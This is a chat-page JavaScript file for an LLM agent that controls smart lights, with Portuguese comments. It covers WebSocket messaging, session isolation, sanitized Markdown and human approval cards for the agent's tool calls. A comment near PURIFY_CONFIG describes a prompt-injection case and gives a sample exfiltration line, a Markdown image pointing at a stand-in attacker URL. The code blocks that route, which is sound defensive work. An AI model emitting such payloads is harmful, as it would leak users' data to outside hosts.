/* Chat page behavior. Session isolation uses localStorage marvin_hue_session_id. */

function readChatConfig() {
    const el = document.getElementById('chat-page-config');
    const fallback = {
        statusUrl: '/api/chat/status',
        wsPath: '/ws/chat',
        lightsStatusUrl: '/api/lights/status',
    };
    if (!el) {
        return fallback;
    }
    try {
        return Object.assign(fallback, JSON.parse(el.textContent || '{}'));
    } catch (e) {
        return fallback;
    }
}

const chatConfig = readChatConfig();

// Elementos do DOM
const messagesContainer = document.getElementById('chat-messages');
const messageInput = document.getElementById('message-input');
const sendBtn = document.getElementById('send-btn');
const clearBtn = document.getElementById('clear-btn');
const statusDot = document.getElementById('status-dot');
const statusText = document.getElementById('status-text');
const suggestions = document.getElementById('suggestions');

// WebSocket
let ws = null;
let isTyping = false;
let reconnectAttempts = 0;
const maxReconnectAttempts = 5;

// Id de sessão estável por navegador. É o ÚNICO mecanismo de isolamento
// de histórico no backend (thread_id do checkpointer). DEVE ir em TODOS
// os frames enviados ao /ws/chat — sem ele tudo cai em "default" e as
// sessões compartilham histórico (bug #2).
function getSessionId() {
    let sid = localStorage.getItem('marvin_hue_session_id');
    if (!sid) {
        if (window.crypto && crypto.randomUUID) {
            sid = crypto.randomUUID();
        } else {
            // Fallback UUID v4 para contexto não-seguro (HTTP antigo).
            sid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
                const r = (crypto.getRandomValues(new Uint8Array(1))[0]) % 16;
                const v = c === 'x' ? r : (r & 0x3) | 0x8;
                return v.toString(16);
            });
        }
        localStorage.setItem('marvin_hue_session_id', sid);
    }
    return sid;
}

// Conectar ao WebSocket
function connectWebSocket() {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${protocol}//${window.location.host}${chatConfig.wsPath}`);

    ws.onopen = () => {
        console.log('WebSocket conectado');
        statusDot.classList.remove('offline');
        statusText.textContent = 'Conectado';
        reconnectAttempts = 0;
        // Página recarregada com aprovação pendente: o servidor reenvia o cartão.
        ws.send(JSON.stringify({ action: 'pending', session_id: getSessionId() }));
    };

    ws.onclose = () => {
        console.log('WebSocket desconectado');
        statusDot.classList.add('offline');
        statusText.textContent = 'Desconectado';

        // Tentar reconectar
        if (reconnectAttempts < maxReconnectAttempts) {
            reconnectAttempts++;
            setTimeout(connectWebSocket, 2000 * reconnectAttempts);
        }
    };

    ws.onerror = (error) => {
        console.error('WebSocket erro:', error);
    };

    ws.onmessage = (event) => {
        const data = JSON.parse(event.data);
        handleMessage(data);
    };
}

// Processar mensagem recebida
function handleMessage(data) {
    if (data.type === 'response' || data.type === 'approval_required') {
        awaitingResume = false;
    }
    switch (data.type) {
        case 'typing':
            if (data.content) {
                showTypingIndicator();
            } else {
                hideTypingIndicator();
            }
            break;
        case 'response':
            hideTypingIndicator();
            setApprovalPending(false);
            addMessage(data.content, 'bot');
            break;
        case 'approval_required':
            hideTypingIndicator();
            renderApprovalCard(data.requests || []);
            break;
        case 'error':
            hideTypingIndicator();
            addMessage(data.content, 'error');
            if (awaitingResume) {
                // Retomada falhou: libera o input e pergunta se ainda há pendência.
                awaitingResume = false;
                setApprovalPending(false);
                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ action: 'pending', session_id: getSessionId() }));
                }
            }
            break;
        case 'cleared':
            removeActiveApprovalCards();
            setApprovalPending(false);
            clearMessages();
            addMessage('Histórico limpo. Como posso ajudar?', 'bot');
            break;
    }
}

// Sem mídia nem CSS inline vindos do modelo: um texto injetado (nome de
// cena, descrição) poderia fazer o modelo emitir ![x](http://atacante/?d=...)
// e o navegador buscaria a URL sozinho (exfiltração, #25). A CSP da página
// (img-src 'self' data:) é a segunda barreira.
const PURIFY_CONFIG = {
    FORBID_TAGS: ['img', 'picture', 'source', 'video', 'audio', 'iframe', 'object', 'embed', 'svg', 'style'],
    FORBID_ATTR: ['src', 'srcset', 'style', 'background', 'poster'],
};
let purifyHooked = false;

function ensurePurifyHooks() {
    if (purifyHooked || typeof window.DOMPurify.addHook !== 'function') return;
    window.DOMPurify.addHook('afterSanitizeAttributes', node => {
        if (node.tagName === 'A' && node.hasAttribute('href')) {
            node.setAttribute('target', '_blank');
            node.setAttribute('rel', 'noopener noreferrer');
        }
    });
    purifyHooked = true;
}

// Renderiza Markdown sanitizado; sem DOMPurify ou marked, cai para texto puro (nunca HTML cru)
function renderMarkdownInto(element, content) {
    const text = content == null ? '' : String(content);
    const canSanitize = typeof window.DOMPurify !== 'undefined'
        && typeof window.DOMPurify.sanitize === 'function'
        && window.DOMPurify.isSupported !== false;
    const canParse = typeof window.marked !== 'undefined' && typeof window.marked.parse === 'function';
    if (canSanitize && canParse) {
        ensurePurifyHooks();
        element.innerHTML = window.DOMPurify.sanitize(window.marked.parse(text), PURIFY_CONFIG);
    } else {
        element.textContent = text;
    }
}

function escapeHtml(value) {
    return String(value == null ? '' : value)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function toColorChannel(value) {
    const n = Math.round(Number(value));
    return Number.isFinite(n) ? Math.min(255, Math.max(0, n)) : 0;
}

// Adicionar mensagem ao chat
function addMessage(content, type) {
    // Esconder sugestões após primeira mensagem do usuário
    if (type === 'user' && suggestions) {
        suggestions.style.display = 'none';
    }

    const messageDiv = document.createElement('div');
    messageDiv.className = `message ${type}`;

    // Renderizar Markdown para mensagens do bot, texto simples para o usuário
    if (type === 'bot' || type === 'error') {
        renderMarkdownInto(messageDiv, content);
    } else {
        messageDiv.textContent = content;
    }

    messagesContainer.appendChild(messageDiv);
    scrollToBottom();
}

// Mostrar indicador de digitação
function showTypingIndicator() {
    if (isTyping) return;
    isTyping = true;

    const typingDiv = document.createElement('div');
    typingDiv.className = 'typing-indicator';
    typingDiv.id = 'typing-indicator';
    typingDiv.innerHTML = '<span></span><span></span><span></span>';

    messagesContainer.appendChild(typingDiv);
    scrollToBottom();
}

// Esconder indicador de digitação
function hideTypingIndicator() {
    isTyping = false;
    const typingDiv = document.getElementById('typing-indicator');
    if (typingDiv) {
        typingDiv.remove();
    }
}

// Limpar mensagens
function clearMessages() {
    messagesContainer.innerHTML = '';
    if (suggestions) {
        suggestions.style.display = 'flex';
        messagesContainer.appendChild(suggestions);
    }
}

// Rolar para o final
function scrollToBottom() {
    messagesContainer.scrollTop = messagesContainer.scrollHeight;
}

// ==================== APROVAÇÃO (HITL) ====================
// Rótulos das tools que pedem aprovação (marvin_hue/chat/hitl.py); outra
// tool cai no nome técnico.
const TOOL_LABELS = {
    create_config: 'Criar cena',
    save_current_config: 'Salvar o estado atual como cena',
    create_schedule: 'Criar agendamento',
    set_schedule_enabled: 'Ativar ou desativar agendamento',
    start_mirror: 'Iniciar espelhamento',
};

const ARG_LABELS = {
    config_name: 'Cena',
    name: 'Nome',
    description: 'Descrição',
    mode: 'Modo',
    profile: 'Perfil',
    time_hhmm: 'Horário',
    action: 'Ação',
    days: 'Dias',
    enabled: 'Ativo',
    schedule: 'Agendamento',
    settings: 'Lâmpadas',
};

const WEEKDAYS = ['seg', 'ter', 'qua', 'qui', 'sex', 'sáb', 'dom'];

// Texto livre que vai ser GRAVADO (nome, descrição) aparece inteiro: o
// usuário precisa ver exatamente o que aprova.
const FULL_TEXT_ARGS = new Set(['name', 'config_name', 'description']);
const MAX_ARG_CHARS = 240;
let approvalPending = false;
let awaitingResume = false;

function truncate(text, limit) {
    return text.length > limit ? `${text.slice(0, limit)}…` : text;
}

// "Lâmpada 1: rgb(10, 20, 200) 40%" — uma linha por lâmpada.
function settingsLines(value) {
    return value.map(s => {
        if (!s || typeof s !== 'object') return String(s);
        const rgb = `rgb(${toColorChannel(s.red)}, ${toColorChannel(s.green)}, ${toColorChannel(s.blue)})`;
        const pct = s.brightness_pct != null ? ` ${Number(s.brightness_pct)}%` : '';
        return `${s.light_name}: ${rgb}${pct}`;
    });
}

function argLines(key, value) {
    if (key === 'settings' && Array.isArray(value)) {
        return settingsLines(value);
    }
    if (key === 'days' && Array.isArray(value)) {
        return [value.length ? value.map(d => WEEKDAYS[d] || String(d)).join(', ') : 'todo dia'];
    }
    let text;
    if (typeof value === 'boolean') {
        text = value ? 'Sim' : 'Não';
    } else if (Array.isArray(value)) {
        text = value.map(v => (v !== null && typeof v === 'object') ? JSON.stringify(v) : String(v)).join(', ');
    } else if (value !== null && typeof value === 'object') {
        text = JSON.stringify(value);
    } else {
        text = String(value == null ? '' : value);
    }
    return [FULL_TEXT_ARGS.has(key) ? text : truncate(text, MAX_ARG_CHARS)];
}

function setApprovalPending(pending) {
    approvalPending = pending;
    messageInput.disabled = pending;
    sendBtn.disabled = pending;
    messageInput.placeholder = pending
        ? 'Aprove ou rejeite a ação acima para continuar…'
        : (messageInput.dataset.placeholder || messageInput.placeholder);
}

function removeActiveApprovalCards() {
    messagesContainer.querySelectorAll('.approval-card.active').forEach(el => el.remove());
}

// Resposta do servidor sem nada pendente (ex.: "pending" após recarregar).
function clearApprovalState() {
    removeActiveApprovalCards();
    awaitingResume = false;
    setApprovalPending(false);
}

// Monta o cartão só com createElement/textContent: args vêm do modelo (não confiáveis).
function renderApprovalCard(requests) {
    if (!requests.length) {
        clearApprovalState();
        return;
    }
    removeActiveApprovalCards();
    if (suggestions) {
        suggestions.style.display = 'none';
    }

    const card = document.createElement('div');
    card.className = 'message bot approval-card active';
    card.setAttribute('role', 'group');
    card.setAttribute('aria-label', 'Aprovação necessária');

    const title = document.createElement('div');
    title.className = 'approval-title';
    title.textContent = requests.length > 1
        ? `Aprovação necessária (${requests.length} ações)`
        : 'Aprovação necessária';
    card.appendChild(title);

    const decisions = new Array(requests.length).fill(null);
    let decidable = true;

    requests.forEach((req, index) => {
        const item = document.createElement('div');
        item.className = 'approval-item';

        const tool = document.createElement('div');
        tool.className = 'approval-tool';
        tool.textContent = TOOL_LABELS[req.tool] || req.tool || 'Ação';
        item.appendChild(tool);

        if (req.description) {
            const desc = document.createElement('div');
            desc.className = 'approval-description';
            desc.textContent = req.description;
            item.appendChild(desc);
        }

        const args = req.args || {};
        const keys = Object.keys(args);
        if (keys.length) {
            const list = document.createElement('dl');
            list.className = 'approval-args';
            keys.forEach(key => {
                const dt = document.createElement('dt');
                dt.textContent = ARG_LABELS[key] || key;
                const dd = document.createElement('dd');
                argLines(key, args[key]).forEach(line => {
                    const row = document.createElement('div');
                    row.textContent = line;
                    dd.appendChild(row);
                });
                list.appendChild(dt);
                list.appendChild(dd);
            });
            item.appendChild(list);
        }

        const actions = document.createElement('div');
        actions.className = 'approval-actions';
        const allowed = Array.isArray(req.allowed_decisions) ? req.allowed_decisions : [];

        if (!allowed.length) {
            // Sem decisão possível aqui: avisa em vez de travar o chat.
            decidable = false;
            const note = document.createElement('span');
            note.className = 'approval-outcome';
            note.textContent = 'Esta ação não pode ser decidida aqui.';
            actions.appendChild(note);
            item.appendChild(actions);
            card.appendChild(item);
            return;
        }

        const outcome = document.createElement('span');
        outcome.className = 'approval-outcome';
        outcome.setAttribute('aria-live', 'polite');

        const makeButton = (type, label, css) => {
            const btn = document.createElement('button');
            btn.type = 'button';
            btn.className = `btn btn-sm ${css}`;
            btn.textContent = label;
            btn.disabled = !allowed.includes(type);
            btn.addEventListener('click', () => {
                decisions[index] = { id: req.id, type };
                actions.querySelectorAll('button').forEach(b => { b.disabled = true; });
                outcome.textContent = type === 'approve' ? 'Aprovado' : 'Rejeitado';
                outcome.classList.add(type === 'approve' ? 'approved' : 'rejected');
                if (decisions.every(d => d !== null)) {
                    sendResume(card, decisions);
                }
            });
            return btn;
        };

        actions.appendChild(makeButton('approve', 'Aprovar', 'btn-success'));
        actions.appendChild(makeButton('reject', 'Rejeitar', 'btn-outline-danger'));
        actions.appendChild(outcome);
        item.appendChild(actions);
        card.appendChild(item);
    });

    messagesContainer.appendChild(card);
    setApprovalPending(decidable);
    scrollToBottom();
}

function sendResume(card, decisions) {
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        // Ao reconectar, o "pending" do onopen reapresenta o cartão.
        addMessage('Não conectado ao servidor. Tentando reconectar...', 'error');
        card.remove();
        setApprovalPending(false);
        connectWebSocket();
        return;
    }
    card.classList.remove('active');
    awaitingResume = true;
    ws.send(JSON.stringify({
        action: 'resume',
        session_id: getSessionId(),
        decisions: decisions
    }));
}

// Enviar mensagem
function sendMessage() {
    const message = messageInput.value.trim();
    if (!message || approvalPending) return;

    if (!ws || ws.readyState !== WebSocket.OPEN) {
        addMessage('Não conectado ao servidor. Tentando reconectar...', 'error');
        connectWebSocket();
        return;
    }

    // Adicionar mensagem do usuário
    addMessage(message, 'user');

    // Enviar via WebSocket
    ws.send(JSON.stringify({
        action: 'message',
        message: message,
        session_id: getSessionId()
    }));

    // Limpar input
    messageInput.value = '';
}

// Event listeners
sendBtn.addEventListener('click', sendMessage);

messageInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        sendMessage();
    }
});

clearBtn.addEventListener('click', () => {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ action: 'clear', session_id: getSessionId() }));
    }
});

// Sugestões
document.querySelectorAll('.suggestion-chip').forEach(chip => {
    chip.addEventListener('click', () => {
        const message = chip.dataset.message;
        messageInput.value = message;
        sendMessage();
    });
});

// Toggle de tema
const themeToggle = document.getElementById('theme-btn');
const themeIcon = document.getElementById('theme-icon');
const html = document.documentElement;

function updateThemeIcon() {
    const isDark = html.getAttribute('data-bs-theme') === 'dark';
    themeIcon.className = isDark ? 'bi bi-sun-fill' : 'bi bi-moon-fill';
}

themeToggle.addEventListener('click', () => {
    const currentTheme = html.getAttribute('data-bs-theme');
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    html.setAttribute('data-bs-theme', newTheme);
    localStorage.setItem('theme', newTheme);
    updateThemeIcon();
});

// Carregar tema salvo
const savedTheme = localStorage.getItem('theme');
if (savedTheme) {
    html.setAttribute('data-bs-theme', savedTheme);
}
updateThemeIcon();

// Verificar status do chat
async function checkChatStatus() {
    try {
        const response = await fetch(chatConfig.statusUrl);
        const data = await response.json();
        const modelBadge = document.getElementById('model-badge');

        if (data.provider && data.model) {
            modelBadge.textContent = `${data.provider} · ${data.model}`;
            modelBadge.hidden = false;
        }

        if (!data.available) {
            addMessage(`Aviso: ${data.error}`, 'error');
        }
    } catch (error) {
        console.error('Erro ao verificar status:', error);
    }
}

// ==================== PAINEL DE LÂMPADAS ====================
const lightsPanel = document.getElementById('lights-panel');
let isLoadingLights = false;

function loadLightsStatus() {
    if (isLoadingLights) return;
    isLoadingLights = true;

    fetch(chatConfig.lightsStatusUrl)
        .then(response => response.json())
        .then(data => {
            renderLights(data.lights);
        })
        .catch(error => {
            console.error('Erro ao carregar lâmpadas:', error);
        })
        .finally(() => {
            isLoadingLights = false;
        });
}

function renderLights(lights) {
    if (!lights || lights.length === 0) {
        lightsPanel.innerHTML = '<small style="opacity: 0.6">Nenhuma lâmpada encontrada</small>';
        return;
    }

    // Ordenar por nome
    lights.sort((a, b) => a.name.localeCompare(b.name, 'pt-BR'));

    lightsPanel.innerHTML = lights.map(light => {
        const color = light.color || {};
        const rgbColor = `rgb(${toColorChannel(color.r)}, ${toColorChannel(color.g)}, ${toColorChannel(color.b)})`;
        const safeName = escapeHtml(light.name);
        const isOn = light.on && light.reachable;
        const stateClass = isOn ? 'on' : 'off';

        return `
            <div class="light-mini" title="${safeName}">
                <div class="light-mini-bulb ${stateClass}"
                     style="background-color: ${rgbColor}; --light-color: ${rgbColor}">
                </div>
                <span class="light-mini-name">${safeName}</span>
            </div>
        `;
    }).join('');
}

// Atualizar lâmpadas periodicamente
setInterval(loadLightsStatus, 3000);

// Atualizar após receber resposta do bot (pode ter mudado as luzes)
const originalHandleMessage = handleMessage;
handleMessage = function(data) {
    originalHandleMessage(data);
    if (data.type === 'response') {
        // Aguarda um pouco para as luzes atualizarem
        setTimeout(loadLightsStatus, 500);
    }
};

// ==================== SALVAR CONFIGURAÇÃO ====================
const saveConfigBtn = document.getElementById('save-config-btn');
const saveConfigModal = new bootstrap.Modal(document.getElementById('saveConfigModal'));
const configNameInput = document.getElementById('config-name-input');
const configDescriptionInput = document.getElementById('config-description-input');
const confirmSaveConfigBtn = document.getElementById('confirm-save-config-btn');

// Abrir modal ao clicar no botão
saveConfigBtn.addEventListener('click', () => {
    // Limpar campos
    configNameInput.value = '';
    configDescriptionInput.value = '';
    saveConfigModal.show();
});

// Confirmar salvamento
confirmSaveConfigBtn.addEventListener('click', () => {
    const configName = configNameInput.value.trim();
    const configDescription = configDescriptionInput.value.trim();

    if (!configName) {
        alert('Por favor, informe um nome para a configuração.');
        return;
    }

    if (!configDescription) {
        alert('Por favor, informe uma descrição para a configuração.');
        return;
    }

    // Validar nome (sem espaços ou caracteres especiais)
    const nameRegex = /^[a-zA-Z0-9_]+$/;
    if (!nameRegex.test(configName)) {
        alert('O nome deve conter apenas letras, números e underscores (sem espaços ou caracteres especiais).');
        return;
    }

    // Fechar modal
    saveConfigModal.hide();

    // Enviar mensagem ao agente
    const message = `Salve a configuração atual com o nome "${configName}" e descrição "${configDescription}"`;
    messageInput.value = message;
    sendMessage();
});

// Permitir salvar com Enter no campo de nome
configNameInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        e.preventDefault();
        configDescriptionInput.focus();
    }
});

// Permitir salvar com Ctrl+Enter no campo de descrição
configDescriptionInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter' && e.ctrlKey) {
        e.preventDefault();
        confirmSaveConfigBtn.click();
    }
});

// Inicialização
messageInput.dataset.placeholder = messageInput.placeholder;
connectWebSocket();
checkChatStatus();
loadLightsStatus();
